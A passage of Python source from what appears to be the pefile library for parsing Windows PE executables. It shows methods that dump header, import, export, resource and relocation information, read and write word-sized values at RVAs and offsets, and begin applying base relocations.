        null_index = -1
        while True:
            null_index = data.find(b"\x00\x00", null_index + 1)
            if null_index == -1:
                data_length = len(data)
                if data_length < requested or data_length == max_length:
                    null_index = len(data) >> 1
                    break

                # Request remaining part of data limited by max_length
                data += self.get_data(rva + data_length, max_length - data_length)
                null_index = requested - 1
                requested = max_length

            elif null_index % 2 == 0:
                null_index >>= 1
                break

        # convert selected part of the string to unicode
        uchrs = struct.unpack("<{:d}H".format(null_index), data[: null_index * 2])
        s = "".join(map(chr, uchrs))

        if encoding:
            return b(s.encode(encoding, "backslashreplace_"))

        return b(s.encode("utf-8", "backslashreplace_"))

    def get_section_by_offset(self, offset):
        """Get the section containing the given file offset."""

        for section in self.sections:
            if section.contains_offset(offset):
                return section

        return None

    def get_section_by_rva(self, rva):
        """Get the section containing the given address."""

        # if we look a lot of times at RVA in the same section, "cache" the last used section
        # to speedup lookups (very useful when parsing import table)
        if self._get_section_by_rva_last_used is not None:
            if self._get_section_by_rva_last_used.contains_rva(rva):
                return self._get_section_by_rva_last_used

        for section in self.sections:
            if section.contains_rva(rva):
                self._get_section_by_rva_last_used = section
                return section

        return None

    def __str__(self):
        return self.dump_info()

    def has_relocs(self):
        """Checks if the PE file has relocation directory"""
        return hasattr(self, "DIRECTORY_ENTRY_BASERELOC")

    def print_info(self, encoding="utf-8"):
        """Print all the PE header information in a human readable from."""
        print(self.dump_info(encoding=encoding))

    def dump_info(self, dump=None, encoding="ascii"):
        """Dump all the PE header information into human readable string."""

        if dump is None:
            dump = Dump()

        warnings = self.get_warnings()
        if warnings:
            dump.add_header("Parsing Warnings")
            for warning in warnings:
                dump.add_line(warning)
                dump.add_newline()

        dump.add_header("DOS_HEADER")
        dump.add_lines(self.DOS_HEADER.dump())
        dump.add_newline()

        dump.add_header("NT_HEADERS")
        dump.add_lines(self.NT_HEADERS.dump())
        dump.add_newline()

        dump.add_header("FILE_HEADER")
        dump.add_lines(self.FILE_HEADER.dump())

        image_flags = retrieve_flags(IMAGE_CHARACTERISTICS, "IMAGE_FILE_")

        dump.add("Flags: ")
        flags = []
        for flag in sorted(image_flags):
            if getattr(self.FILE_HEADER, flag[0]):
                flags.append(flag[0])
        dump.add_line(", ".join(flags))
        dump.add_newline()

        if hasattr(self, "OPTIONAL_HEADER") and self.OPTIONAL_HEADER is not None:
            dump.add_header("OPTIONAL_HEADER")
            dump.add_lines(self.OPTIONAL_HEADER.dump())

        dll_characteristics_flags = retrieve_flags(
            DLL_CHARACTERISTICS, "IMAGE_DLLCHARACTERISTICS_"
        )

        dump.add("DllCharacteristics: ")
        flags = []
        for flag in sorted(dll_characteristics_flags):
            if getattr(self.OPTIONAL_HEADER, flag[0]):
                flags.append(flag[0])
        dump.add_line(", ".join(flags))
        dump.add_newline()

        dump.add_header("PE Sections")

        section_flags = retrieve_flags(SECTION_CHARACTERISTICS, "IMAGE_SCN_")

        for section in self.sections:
            dump.add_lines(section.dump())
            dump.add("Flags: ")
            flags = []
            for flag in sorted(section_flags):
                if getattr(section, flag[0]):
                    flags.append(flag[0])
            dump.add_line(", ".join(flags))
            dump.add_line(
                "Entropy: {0:f} (Min=0.0, Max=8.0)".format(section.get_entropy())
            )
            if md5 is not None:
                dump.add_line("MD5     hash: {0}".format(section.get_hash_md5()))
            if sha1 is not None:
                dump.add_line("SHA-1   hash: %s" % section.get_hash_sha1())
            if sha256 is not None:
                dump.add_line("SHA-256 hash: %s" % section.get_hash_sha256())
            if sha512 is not None:
                dump.add_line("SHA-512 hash: %s" % section.get_hash_sha512())
            dump.add_newline()

        if hasattr(self, "OPTIONAL_HEADER") and hasattr(
            self.OPTIONAL_HEADER, "DATA_DIRECTORY"
        ):

            dump.add_header("Directories")
            for directory in self.OPTIONAL_HEADER.DATA_DIRECTORY:
                if directory is not None:
                    dump.add_lines(directory.dump())
            dump.add_newline()

        if hasattr(self, "VS_VERSIONINFO"):
            for idx, vinfo_entry in enumerate(self.VS_VERSIONINFO):
                if len(self.VS_VERSIONINFO) > 1:
                    dump.add_header("Version Information %x" % idx + 1)
                else:
                    dump.add_header("Version Information")
                if vinfo_entry is not None:
                    dump.add_lines(vinfo_entry.dump())
                dump.add_newline()

                if hasattr(self, "VS_FIXEDFILEINFO"):
                    dump.add_lines(self.VS_FIXEDFILEINFO[idx].dump())
                    dump.add_newline()

                if hasattr(self, "FileInfo") and len(self.FileInfo) > idx:
                    for entry in self.FileInfo[idx]:
                        dump.add_lines(entry.dump())
                        dump.add_newline()

                        if hasattr(entry, "StringTable"):
                            for st_entry in entry.StringTable:
                                [dump.add_line("  " + line) for line in st_entry.dump()]
                                dump.add_line(
                                    "  LangID: {0}".format(
                                        st_entry.LangID.decode(
                                            encoding, "backslashreplace_"
                                        )
                                    )
                                )
                                dump.add_newline()
                                for str_entry in sorted(list(st_entry.entries.items())):
                                    # try:
                                    dump.add_line(
                                        "    {0}: {1}".format(
                                            str_entry[0].decode(
                                                encoding, "backslashreplace_"
                                            ),
                                            str_entry[1].decode(
                                                encoding, "backslashreplace_"
                                            ),
                                        )
                                    )

                            dump.add_newline()

                        elif hasattr(entry, "Var"):
                            for var_entry in entry.Var:
                                if hasattr(var_entry, "entry"):
                                    [
                                        dump.add_line("  " + line)
                                        for line in var_entry.dump()
                                    ]
                                    dump.add_line(
                                        "    {0}: {1}".format(
                                            list(var_entry.entry.keys())[0].decode(
                                                "utf-8", "backslashreplace_"
                                            ),
                                            list(var_entry.entry.values())[0],
                                        )
                                    )

                            dump.add_newline()

        if hasattr(self, "DIRECTORY_ENTRY_EXPORT"):
            dump.add_header("Exported symbols")
            dump.add_lines(self.DIRECTORY_ENTRY_EXPORT.struct.dump())
            dump.add_newline()
            dump.add_line("%-10s   %-10s  %s" % ("Ordinal", "RVA", "Name"))
            for export in self.DIRECTORY_ENTRY_EXPORT.symbols:
                if export.address is not None:
                    name = b("None")
                    if export.name:
                        name = export.name
                    dump.add(
                        "%-10d 0x%08X    %s"
                        % (export.ordinal, export.address, name.decode(encoding))
                    )
                    if export.forwarder:
                        dump.add_line(
                            " forwarder: {0}".format(
                                export.forwarder.decode(encoding, "backslashreplace_")
                            )
                        )
                    else:
                        dump.add_newline()

            dump.add_newline()

        if hasattr(self, "DIRECTORY_ENTRY_IMPORT"):
            dump.add_header("Imported symbols")
            for module in self.DIRECTORY_ENTRY_IMPORT:
                dump.add_lines(module.struct.dump())
                # Print the name of the DLL if there are no imports.
                if not module.imports:
                    dump.add(
                        "  Name -> {0}".format(
                            self.get_string_at_rva(module.struct.Name).decode(
                                encoding, "backslashreplace_"
                            )
                        )
                    )
                    dump.add_newline()
                dump.add_newline()
                for symbol in module.imports:
                    if symbol.import_by_ordinal is True:
                        if symbol.name is not None:
                            dump.add(
                                "{0}.{1} Ordinal[{2}] (Imported by Ordinal)".format(
                                    module.dll.decode("utf-8"),
                                    symbol.name.decode("utf-8"),
                                    symbol.ordinal,
                                )
                            )
                        else:
                            dump.add(
                                "{0} Ordinal[{1}] (Imported by Ordinal)".format(
                                    module.dll.decode("utf-8"), symbol.ordinal
                                )
                            )
                    else:
                        dump.add(
                            "{0}.{1} Hint[{2:d}]".format(
                                module.dll.decode(encoding, "backslashreplace_"),
                                symbol.name.decode(encoding, "backslashreplace_"),
                                symbol.hint,
                            )
                        )

                    if symbol.bound:
                        dump.add_line(" Bound: 0x{0:08X}".format(symbol.bound))
                    else:
                        dump.add_newline()
                dump.add_newline()

        if hasattr(self, "DIRECTORY_ENTRY_BOUND_IMPORT"):
            dump.add_header("Bound imports")
            for bound_imp_desc in self.DIRECTORY_ENTRY_BOUND_IMPORT:

                dump.add_lines(bound_imp_desc.struct.dump())
                dump.add_line(
                    "DLL: {0}".format(
                        bound_imp_desc.name.decode(encoding, "backslashreplace_")
                    )
                )
                dump.add_newline()

                for bound_imp_ref in bound_imp_desc.entries:
                    dump.add_lines(bound_imp_ref.struct.dump(), 4)
                    dump.add_line(
                        "DLL: {0}".format(
                            bound_imp_ref.name.decode(encoding, "backslashreplace_")
                        ),
                        4,
                    )
                    dump.add_newline()

        if hasattr(self, "DIRECTORY_ENTRY_DELAY_IMPORT"):
            dump.add_header("Delay Imported symbols")
            for module in self.DIRECTORY_ENTRY_DELAY_IMPORT:

                dump.add_lines(module.struct.dump())
                dump.add_newline()

                for symbol in module.imports:
                    if symbol.import_by_ordinal is True:
                        dump.add(
                            "{0} Ordinal[{1:d}] (Imported by Ordinal)".format(
                                module.dll.decode(encoding, "backslashreplace_"),
                                symbol.ordinal,
                            )
                        )
                    else:
                        dump.add(
                            "{0}.{1} Hint[{2}]".format(
                                module.dll.decode(encoding, "backslashreplace_"),
                                symbol.name.decode(encoding, "backslashreplace_"),
                                symbol.hint,
                            )
                        )

                    if symbol.bound:
                        dump.add_line(" Bound: 0x{0:08X}".format(symbol.bound))
                    else:
                        dump.add_newline()
                dump.add_newline()

        if hasattr(self, "DIRECTORY_ENTRY_RESOURCE"):
            dump.add_header("Resource directory")

            dump.add_lines(self.DIRECTORY_ENTRY_RESOURCE.struct.dump())

            for res_type in self.DIRECTORY_ENTRY_RESOURCE.entries:

                if res_type.name is not None:
                    name = res_type.name.decode(encoding, "backslashreplace_")
                    dump.add_line( "Name: [%s]" % name, 2,)
                else:
                    res_type_id = RESOURCE_TYPE.get(res_type.struct.Id, "-")
                    dump.add_line( "Id: [0x%x] (%d)" % (res_type.struct.Id, res_type_id), 2,)

                dump.add_lines(res_type.struct.dump(), 2)

                if hasattr(res_type, "directory"):

                    dump.add_lines(res_type.directory.struct.dump(), 4)

                    for resource_id in res_type.directory.entries:

                        if resource_id.name is not None:
                            name = resource_id.name.decode("utf-8", "backslashreplace_")
                            dump.add_line( "Name: [%s]" % name, 6,)
                        else:
                            dump.add_line("Id: [0x%x]" % resource_id.struct.Id, 6)

                        dump.add_lines(resource_id.struct.dump(), 6)

                        if hasattr(resource_id, "directory"):
                            dump.add_lines(resource_id.directory.struct.dump(), 8)

                            for resource_lang in resource_id.directory.entries:
                                if hasattr(resource_lang, "data"):
                                    dump.add_line(
                                        "\\--- LANG [%d,%d][%s,%s]"
                                        % (
                                            resource_lang.data.lang,
                                            resource_lang.data.sublang,
                                            LANG.get(
                                                resource_lang.data.lang, "*unknown*"
                                            ),
                                            get_sublang_name_for_lang(
                                                resource_lang.data.lang,
                                                resource_lang.data.sublang,
                                            ),
                                        ),
                                        8,
                                    )
                                    dump.add_lines(resource_lang.struct.dump(), 10)
                                    dump.add_lines(resource_lang.data.struct.dump(), 12)
                            if (
                                hasattr(resource_id.directory, "strings")
                                and resource_id.directory.strings
                            ):
                                dump.add_line("[STRINGS]", 10)
                                for idx, res_string in list(
                                    sorted(resource_id.directory.strings.items())
                                ):
                                    dump.add_line(
                                        "{0:6d}: {1}".format(
                                            idx,
                                            res_string.encode(
                                                "unicode-escape", "backslashreplace"
                                            ).decode("ascii"),
                                        ),
                                        12,
                                    )

                dump.add_newline()

            dump.add_newline()

        if (
            hasattr(self, "DIRECTORY_ENTRY_TLS")
            and self.DIRECTORY_ENTRY_TLS
            and self.DIRECTORY_ENTRY_TLS.struct
        ):

            dump.add_header("TLS")
            dump.add_lines(self.DIRECTORY_ENTRY_TLS.struct.dump())
            dump.add_newline()

        if (
            hasattr(self, "DIRECTORY_ENTRY_LOAD_CONFIG")
            and self.DIRECTORY_ENTRY_LOAD_CONFIG
            and self.DIRECTORY_ENTRY_LOAD_CONFIG.struct
        ):

            dump.add_header("LOAD_CONFIG")
            dump.add_lines(self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.dump())
            dump.add_newline()

        if hasattr(self, "DIRECTORY_ENTRY_DEBUG"):
            dump.add_header("Debug information")
            for dbg in self.DIRECTORY_ENTRY_DEBUG:
                dump.add_lines(dbg.struct.dump())
                try:
                    dump.add_line("Type: " + DEBUG_TYPE[dbg.struct.Type])
                except KeyError:
                    dump.add_line("Type: 0x{0:x}(Unknown)".format(dbg.struct.Type))
                dump.add_newline()
                if dbg.entry:
                    dump.add_lines(dbg.entry.dump(), 4)
                    dump.add_newline()

        if self.has_relocs():
            dump.add_header("Base relocations")
            for base_reloc in self.DIRECTORY_ENTRY_BASERELOC:
                dump.add_lines(base_reloc.struct.dump())
                for reloc in base_reloc.entries:
                    try:
                        dump.add_line(
                            "%08Xh %s" % (reloc.rva, RELOCATION_TYPE[reloc.type][16:]),
                            4,
                        )
                    except KeyError:
                        dump.add_line(
                            "0x%08X 0x%x(Unknown)" % (reloc.rva, reloc.type), 4
                        )
                dump.add_newline()

        if (
            hasattr(self, "DIRECTORY_ENTRY_EXCEPTION")
            and len(self.DIRECTORY_ENTRY_EXCEPTION) > 0
        ):
            dump.add_header("Unwind data for exception handling")
            for rf in self.DIRECTORY_ENTRY_EXCEPTION:
                dump.add_lines(rf.struct.dump())
                if hasattr(rf, "unwindinfo") and rf.unwindinfo is not None:
                    dump.add_lines(rf.unwindinfo.dump(), 4)

        return dump.get_text()

    def dump_dict(self):
        """Dump all the PE header information into a dictionary."""

        dump_dict = {}

        warnings = self.get_warnings()
        if warnings:
            dump_dict["Parsing Warnings"] = warnings

        dump_dict["DOS_HEADER"] = self.DOS_HEADER.dump_dict()
        dump_dict["NT_HEADERS"] = self.NT_HEADERS.dump_dict()
        dump_dict["FILE_HEADER"] = self.FILE_HEADER.dump_dict()

        image_flags = retrieve_flags(IMAGE_CHARACTERISTICS, "IMAGE_FILE_")

        dump_dict["Flags"] = []
        for flag in image_flags:
            if getattr(self.FILE_HEADER, flag[0]):
                dump_dict["Flags"].append(flag[0])

        if hasattr(self, "OPTIONAL_HEADER") and self.OPTIONAL_HEADER is not None:
            dump_dict["OPTIONAL_HEADER"] = self.OPTIONAL_HEADER.dump_dict()

        dll_characteristics_flags = retrieve_flags(
            DLL_CHARACTERISTICS, "IMAGE_DLLCHARACTERISTICS_"
        )

        dump_dict["DllCharacteristics"] = []
        for flag in dll_characteristics_flags:
            if getattr(self.OPTIONAL_HEADER, flag[0]):
                dump_dict["DllCharacteristics"].append(flag[0])

        dump_dict["PE Sections"] = []

        section_flags = retrieve_flags(SECTION_CHARACTERISTICS, "IMAGE_SCN_")
        for section in self.sections:
            section_dict = section.dump_dict()
            dump_dict["PE Sections"].append(section_dict)
            section_dict["Flags"] = []
            for flag in section_flags:
                if getattr(section, flag[0]):
                    section_dict["Flags"].append(flag[0])

            section_dict["Entropy"] = section.get_entropy()
            if md5 is not None:
                section_dict["MD5"] = section.get_hash_md5()
            if sha1 is not None:
                section_dict["SHA1"] = section.get_hash_sha1()
            if sha256 is not None:
                section_dict["SHA256"] = section.get_hash_sha256()
            if sha512 is not None:
                section_dict["SHA512"] = section.get_hash_sha512()

        if hasattr(self, "OPTIONAL_HEADER") and hasattr(
            self.OPTIONAL_HEADER, "DATA_DIRECTORY"
        ):

            dump_dict["Directories"] = []

            for idx, directory in enumerate(self.OPTIONAL_HEADER.DATA_DIRECTORY):
                if directory is not None:
                    dump_dict["Directories"].append(directory.dump_dict())

        if hasattr(self, "VS_VERSIONINFO"):
            dump_dict["Version Information"] = []
            for idx, vs_vinfo in enumerate(self.VS_VERSIONINFO):
                version_info_list = []
                version_info_list.append(vs_vinfo.dump_dict())

                if hasattr(self, "VS_FIXEDFILEINFO"):
                    version_info_list.append(self.VS_FIXEDFILEINFO[idx].dump_dict())

                if hasattr(self, "FileInfo") and len(self.FileInfo) > idx:
                    fileinfo_list = []
                    version_info_list.append(fileinfo_list)
                    for entry in self.FileInfo[idx]:
                        fileinfo_list.append(entry.dump_dict())

                        if hasattr(entry, "StringTable"):
                            stringtable_dict = {}
                            for st_entry in entry.StringTable:
                                fileinfo_list.extend(st_entry.dump_dict())
                                stringtable_dict["LangID"] = st_entry.LangID
                                for str_entry in list(st_entry.entries.items()):
                                    stringtable_dict[str_entry[0]] = str_entry[1]
                            fileinfo_list.append(stringtable_dict)

                        elif hasattr(entry, "Var"):
                            for var_entry in entry.Var:
                                var_dict = {}
                                if hasattr(var_entry, "entry"):
                                    fileinfo_list.extend(var_entry.dump_dict())
                                    var_dict[list(var_entry.entry.keys())[0]] = list(
                                        var_entry.entry.values()
                                    )[0]
                                    fileinfo_list.append(var_dict)

                dump_dict["Version Information"].append(version_info_list)

        if hasattr(self, "DIRECTORY_ENTRY_EXPORT"):
            dump_dict["Exported symbols"] = []
            dump_dict["Exported symbols"].append(
                self.DIRECTORY_ENTRY_EXPORT.struct.dump_dict()
            )
            for export in self.DIRECTORY_ENTRY_EXPORT.symbols:
                export_dict = {}
                if export.address is not None:
                    export_dict.update(
                        {
                            "Ordinal": export.ordinal,
                            "RVA": export.address,
                            "Name": export.name,
                        }
                    )
                    if export.forwarder:
                        export_dict["forwarder"] = export.forwarder
                dump_dict["Exported symbols"].append(export_dict)

        if hasattr(self, "DIRECTORY_ENTRY_IMPORT"):
            dump_dict["Imported symbols"] = []
            for module in self.DIRECTORY_ENTRY_IMPORT:
                import_list = []
                dump_dict["Imported symbols"].append(import_list)
                import_list.append(module.struct.dump_dict())
                for symbol in module.imports:
                    symbol_dict = {}
                    if symbol.import_by_ordinal is True:
                        symbol_dict["DLL"] = module.dll
                        symbol_dict["Ordinal"] = symbol.ordinal
                    else:
                        symbol_dict["DLL"] = module.dll
                        symbol_dict["Name"] = symbol.name
                        symbol_dict["Hint"] = symbol.hint

                    if symbol.bound:
                        symbol_dict["Bound"] = symbol.bound
                    import_list.append(symbol_dict)

        if hasattr(self, "DIRECTORY_ENTRY_BOUND_IMPORT"):
            dump_dict["Bound imports"] = []
            for bound_imp_desc in self.DIRECTORY_ENTRY_BOUND_IMPORT:
                bound_imp_desc_dict = {}
                dump_dict["Bound imports"].append(bound_imp_desc_dict)

                bound_imp_desc_dict.update(bound_imp_desc.struct.dump_dict())
                bound_imp_desc_dict["DLL"] = bound_imp_desc.name

                for bound_imp_ref in bound_imp_desc.entries:
                    bound_imp_ref_dict = {}
                    bound_imp_ref_dict.update(bound_imp_ref.struct.dump_dict())
                    bound_imp_ref_dict["DLL"] = bound_imp_ref.name

        if hasattr(self, "DIRECTORY_ENTRY_DELAY_IMPORT"):
            dump_dict["Delay Imported symbols"] = []
            for module in self.DIRECTORY_ENTRY_DELAY_IMPORT:
                module_list = []
                dump_dict["Delay Imported symbols"].append(module_list)
                module_list.append(module.struct.dump_dict())

                for symbol in module.imports:
                    symbol_dict = {}
                    if symbol.import_by_ordinal is True:
                        symbol_dict["DLL"] = module.dll
                        symbol_dict["Ordinal"] = symbol.ordinal
                    else:
                        symbol_dict["DLL"] = module.dll
                        symbol_dict["Name"] = symbol.name
                        symbol_dict["Hint"] = symbol.hint

                    if symbol.bound:
                        symbol_dict["Bound"] = symbol.bound
                    module_list.append(symbol_dict)

        if hasattr(self, "DIRECTORY_ENTRY_RESOURCE"):
            dump_dict["Resource directory"] = []
            dump_dict["Resource directory"].append(
                self.DIRECTORY_ENTRY_RESOURCE.struct.dump_dict()
            )

            for res_type in self.DIRECTORY_ENTRY_RESOURCE.entries:
                resource_type_dict = {}

                if res_type.name is not None:
                    resource_type_dict["Name"] = res_type.name
                else:
                    resource_type_dict["Id"] = (
                        res_type.struct.Id,
                        RESOURCE_TYPE.get(res_type.struct.Id, "-"),
                    )

                resource_type_dict.update(res_type.struct.dump_dict())
                dump_dict["Resource directory"].append(resource_type_dict)

                if hasattr(res_type, "directory"):
                    directory_list = []
                    directory_list.append(res_type.directory.struct.dump_dict())
                    dump_dict["Resource directory"].append(directory_list)

                    for resource_id in res_type.directory.entries:
                        resource_id_dict = {}

                        if resource_id.name is not None:
                            resource_id_dict["Name"] = resource_id.name
                        else:
                            resource_id_dict["Id"] = resource_id.struct.Id

                        resource_id_dict.update(resource_id.struct.dump_dict())
                        directory_list.append(resource_id_dict)

                        if hasattr(resource_id, "directory"):
                            resource_id_list = []
                            resource_id_list.append(
                                resource_id.directory.struct.dump_dict()
                            )
                            directory_list.append(resource_id_list)

                            for resource_lang in resource_id.directory.entries:
                                if hasattr(resource_lang, "data"):
                                    resource_lang_dict = {}
                                    resource_lang_dict["LANG"] = resource_lang.data.lang
                                    resource_lang_dict[
                                        "SUBLANG"
                                    ] = resource_lang.data.sublang
                                    resource_lang_dict["LANG_NAME"] = LANG.get(
                                        resource_lang.data.lang, "*unknown*"
                                    )
                                    resource_lang_dict[
                                        "SUBLANG_NAME"
                                    ] = get_sublang_name_for_lang(
                                        resource_lang.data.lang,
                                        resource_lang.data.sublang,
                                    )
                                    resource_lang_dict.update(
                                        resource_lang.struct.dump_dict()
                                    )
                                    resource_lang_dict.update(
                                        resource_lang.data.struct.dump_dict()
                                    )
                                    resource_id_list.append(resource_lang_dict)
                            if (
                                hasattr(resource_id.directory, "strings")
                                and resource_id.directory.strings
                            ):
                                for idx, res_string in list(
                                    resource_id.directory.strings.items()
                                ):
                                    resource_id_list.append(
                                        res_string.encode(
                                            "unicode-escape", "backslashreplace"
                                        ).decode("ascii")
                                    )

        if (
            hasattr(self, "DIRECTORY_ENTRY_TLS")
            and self.DIRECTORY_ENTRY_TLS
            and self.DIRECTORY_ENTRY_TLS.struct
        ):
            dump_dict["TLS"] = self.DIRECTORY_ENTRY_TLS.struct.dump_dict()

        if (
            hasattr(self, "DIRECTORY_ENTRY_LOAD_CONFIG")
            and self.DIRECTORY_ENTRY_LOAD_CONFIG
            and self.DIRECTORY_ENTRY_LOAD_CONFIG.struct
        ):
            dump_dict[
                "LOAD_CONFIG"
            ] = self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.dump_dict()

        if hasattr(self, "DIRECTORY_ENTRY_DEBUG"):
            dump_dict["Debug information"] = []
            for dbg in self.DIRECTORY_ENTRY_DEBUG:
                dbg_dict = {}
                dump_dict["Debug information"].append(dbg_dict)
                dbg_dict.update(dbg.struct.dump_dict())
                dbg_dict["Type"] = DEBUG_TYPE.get(dbg.struct.Type, dbg.struct.Type)

        if self.has_relocs():
            dump_dict["Base relocations"] = []
            for base_reloc in self.DIRECTORY_ENTRY_BASERELOC:
                base_reloc_list = []
                dump_dict["Base relocations"].append(base_reloc_list)
                base_reloc_list.append(base_reloc.struct.dump_dict())
                for reloc in base_reloc.entries:
                    reloc_dict = {}
                    base_reloc_list.append(reloc_dict)
                    reloc_dict["RVA"] = reloc.rva
                    try:
                        reloc_dict["Type"] = RELOCATION_TYPE[reloc.type][16:]
                    except KeyError:
                        reloc_dict["Type"] = reloc.type

        return dump_dict

    # OC Patch
    def get_physical_by_rva(self, rva):
        """Gets the physical address in the PE file from an RVA value."""
        try:
            return self.get_offset_from_rva(rva)
        except Exception:
            return None

    ##
    # Double-Word get / set
    ##

    def get_data_from_dword(self, dword):
        """Return a four byte string representing the double word value (little endian)."""
        return struct.pack("<L", dword & 0xFFFFFFFF)

    def get_dword_from_data(self, data, offset):
        """Convert four bytes of data to a double word (little endian)

        'offset' is assumed to index into a dword array. So setting it to
        N will return a dword out of the data starting at offset N*4.

        Returns None if the data can't be turned into a double word.
        """

        if (offset + 1) * 4 > len(data):
            return None

        return struct.unpack("<I", data[offset * 4 : (offset + 1) * 4])[0]

    def get_dword_at_rva(self, rva):
        """Return the double word value at the given RVA.

        Returns None if the value can't be read, i.e. the RVA can't be mapped
        to a file offset.
        """

        try:
            return self.get_dword_from_data(self.get_data(rva, 4), 0)
        except PEFormatError:
            return None

    def get_dword_from_offset(self, offset):
        """Return the double word value at the given file offset. (little endian)"""

        if offset + 4 > len(self.__data__):
            return None

        return self.get_dword_from_data(self.__data__[offset : offset + 4], 0)

    def set_dword_at_rva(self, rva, dword):
        """Set the double word value at the file offset corresponding to the given RVA."""
        return self.set_bytes_at_rva(rva, self.get_data_from_dword(dword))

    def set_dword_at_offset(self, offset, dword):
        """Set the double word value at the given file offset."""
        return self.set_bytes_at_offset(offset, self.get_data_from_dword(dword))

    ##
    # Word get / set
    ##

    def get_data_from_word(self, word):
        """Return a two byte string representing the word value. (little endian)."""
        return struct.pack("<H", word)

    def get_word_from_data(self, data, offset):
        """Convert two bytes of data to a word (little endian)

        'offset' is assumed to index into a word array. So setting it to
        N will return a dword out of the data starting at offset N*2.

        Returns None if the data can't be turned into a word.
        """

        if (offset + 1) * 2 > len(data):
            return None

        return struct.unpack("<H", data[offset * 2 : (offset + 1) * 2])[0]

    def get_word_at_rva(self, rva):
        """Return the word value at the given RVA.

        Returns None if the value can't be read, i.e. the RVA can't be mapped
        to a file offset.
        """

        try:
            return self.get_word_from_data(self.get_data(rva)[:2], 0)
        except PEFormatError:
            return None

    def get_word_from_offset(self, offset):
        """Return the word value at the given file offset. (little endian)"""

        if offset + 2 > len(self.__data__):
            return None

        return self.get_word_from_data(self.__data__[offset : offset + 2], 0)

    def set_word_at_rva(self, rva, word):
        """Set the word value at the file offset corresponding to the given RVA."""
        return self.set_bytes_at_rva(rva, self.get_data_from_word(word))

    def set_word_at_offset(self, offset, word):
        """Set the word value at the given file offset."""
        return self.set_bytes_at_offset(offset, self.get_data_from_word(word))

    ##
    # Quad-Word get / set
    ##

    def get_data_from_qword(self, word):
        """Return an eight byte string representing the quad-word value (little endian)."""
        return struct.pack("<Q", word)

    def get_qword_from_data(self, data, offset):
        """Convert eight bytes of data to a word (little endian)

        'offset' is assumed to index into a word array. So setting it to
        N will return a dword out of the data starting at offset N*8.

        Returns None if the data can't be turned into a quad word.
        """

        if (offset + 1) * 8 > len(data):
            return None

        return struct.unpack("<Q", data[offset * 8 : (offset + 1) * 8])[0]

    def get_qword_at_rva(self, rva):
        """Return the quad-word value at the given RVA.

        Returns None if the value can't be read, i.e. the RVA can't be mapped
        to a file offset.
        """

        try:
            return self.get_qword_from_data(self.get_data(rva)[:8], 0)
        except PEFormatError:
            return None

    def get_qword_from_offset(self, offset):
        """Return the quad-word value at the given file offset. (little endian)"""

        if offset + 8 > len(self.__data__):
            return None

        return self.get_qword_from_data(self.__data__[offset : offset + 8], 0)

    def set_qword_at_rva(self, rva, qword):
        """Set the quad-word value at the file offset corresponding to the given RVA."""
        return self.set_bytes_at_rva(rva, self.get_data_from_qword(qword))

    def set_qword_at_offset(self, offset, qword):
        """Set the quad-word value at the given file offset."""
        return self.set_bytes_at_offset(offset, self.get_data_from_qword(qword))

    ##
    # Set bytes
    ##

    def set_bytes_at_rva(self, rva, data):
        """Overwrite, with the given string, the bytes at the file offset corresponding
        to the given RVA.

        Return True if successful, False otherwise. It can fail if the
        offset is outside the file's boundaries.
        """

        if not isinstance(data, bytes):
            raise TypeError("data should be of type: bytes")

        offset = self.get_physical_by_rva(rva)
        if not offset:
            return False

        return self.set_bytes_at_offset(offset, data)

    def set_bytes_at_offset(self, offset, data):
        """Overwrite the bytes at the given file offset with the given string.

        Return True if successful, False otherwise. It can fail if the
        offset is outside the file's boundaries.
        """

        if not isinstance(data, bytes):
            raise TypeError("data should be of type: bytes")

        if 0 <= offset < len(self.__data__):
            self.set_data_bytes(offset, data)
        else:
            return False

        return True

    def set_data_bytes(self, offset: int, data: bytes):
        if not isinstance(self.__data__, bytearray):
            self.__data__ = bytearray(self.__data__)

        self.__data__[offset : offset + len(data)] = data

    def merge_modified_section_data(self):
        """Update the PE image content with any individual section data that has been
        modified.
        """

        for section in self.sections:
            section_data_start = self.adjust_FileAlignment(
                section.PointerToRawData, self.OPTIONAL_HEADER.FileAlignment
            )
            section_data_end = section_data_start + section.SizeOfRawData
            if section_data_start < len(self.__data__) and section_data_end < len(
                self.__data__
            ):
                self.set_data_bytes(section_data_start, section.get_data())

    def relocate_image(self, new_ImageBase):
        """Apply the relocation information to the image using the provided image base.

        This method will apply the relocation information to the image. Given the new
        base, all the relocations will be processed and both the raw data and the
        section's data will be fixed accordingly.
        The resulting image can be retrieved as well through the method:

            get_memory_mapped_image()

        In order to get something that would more closely match what could be found in
        memory once the Windows loader finished its work.
        """

        relocation_difference = new_ImageBase - self.OPTIONAL_HEADER.ImageBase

        if (
            len(self.OPTIONAL_HEADER.DATA_DIRECTORY) >= 6
            and self.OPTIONAL_HEADER.DATA_DIRECTORY[5].Size
        ):
            if not hasattr(self, "DIRECTORY_ENTRY_BASERELOC"):
                self.parse_data_directories(
                    directories=[DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_BASERELOC"]]
                )
            if not hasattr(self, "DIRECTORY_ENTRY_BASERELOC"):
                self.__warnings.append(
                    "Relocating image but PE does not have (or pefile cannot "
                    "parse) a DIRECTORY_ENTRY_BASERELOC"
                )
            else:
                for reloc in self.DIRECTORY_ENTRY_BASERELOC:

                    # We iterate with an index because if the relocation is of type
                    # IMAGE_REL_BASED_HIGHADJ we need to also process the next entry
                    # at once and skip it for the next iteration
                    #
                    entry_idx = 0
                    while entry_idx < len(reloc.entries):

                        entry = reloc.entries[entry_idx]
                        entry_idx += 1

                        if entry.type == RELOCATION_TYPE["IMAGE_REL_BASED_ABSOLUTE"]:
                            # Nothing to do for this type of relocation
                            pass

                        elif entry.type == RELOCATION_TYPE["IMAGE_REL_BASED_HIGH"]:
                            # Fix the high 16-bits of a relocation
                            #
                            # Add high 16-bits of relocation_difference to the
                            # 16-bit value at RVA=entry.rva

                            self.set_word_at_rva(
                                entry.rva,
                                (
                                    self.get_word_at_rva(entry.rva)
                                    + relocation_difference
                                    >> 16
                                )
                                & 0xFFFF,
                            )

                        elif entry.type == RELOCATION_TYPE["IMAGE_REL_BASED_LOW"]:
                            # Fix the low 16-bits of a relocation
                            #
                            # Add low 16 bits of relocation_difference to the 16-bit
                            # value at RVA=entry.rva

                            self.set_word_at_rva(
                                entry.rva,
                                (
                                    self.get_word_at_rva(entry.rva)
                                    + relocation_difference
                                )
                                & 0xFFFF,
                            )

                        elif entry.type == RELOCATION_TYPE["IMAGE_REL_BASED_HIGHLOW"]:
                            # Handle all high and low parts of a 32-bit relocation
                            #
